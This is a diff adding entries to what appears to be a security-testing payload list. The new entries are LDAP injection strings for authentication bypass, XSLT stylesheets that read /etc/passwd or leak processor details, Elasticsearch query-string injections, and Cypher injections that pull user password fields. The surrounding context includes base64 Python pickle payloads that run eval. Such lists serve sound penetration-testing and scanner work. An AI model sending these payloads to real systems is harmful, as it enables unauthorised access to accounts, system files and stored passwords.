@@ -393,6 +393,33 @@ INFO
 KEYS *
 ##Format String - Math (.NET)##
 String.Format("{0}",1337)
+##LDAP Injection - Auth Bypass##
+*)(uid=*))(|(uid=*
+admin)(|(objectClass=*
+*))%00
+admin)(&)
+*)(uid=admin
+admin)(cn=admin))(&(uid=admin
+##XSLT Injection - File Read##
+<xsl:value-of select="document('/etc/passwd')"/>
+<xsl:copy-of select="document('/etc/passwd')"/>
+<xsl:value-of select="unparsed-text('/etc/passwd')"/>
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+##XSLT Injection - Info Disclosure##
+<xsl:value-of select="system-property('xsl:vendor')"/>
+<xsl:value-of select="system-property('xsl:version')"/>
+<xsl:value-of select="system-property('xsl:vendor-url')"/>
+##Elasticsearch Injection - Query String##
+_exists_:name
+*:*
+name:admin OR _exists_:role
+id:1337 OR id:>0
+name:/.*admin.*/
+##Cypher Injection - Auth Bypass / Data Extraction##
+' OR '1'='1' //
+admin'//
+' OR 1=1 RETURN u.password //
+') OR 1=1 RETURN u.password AS x //
 ##Python Pickle P0 - Math (eval 7*191)##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
 ##Python Pickle P2 - Math (eval 7*191)##
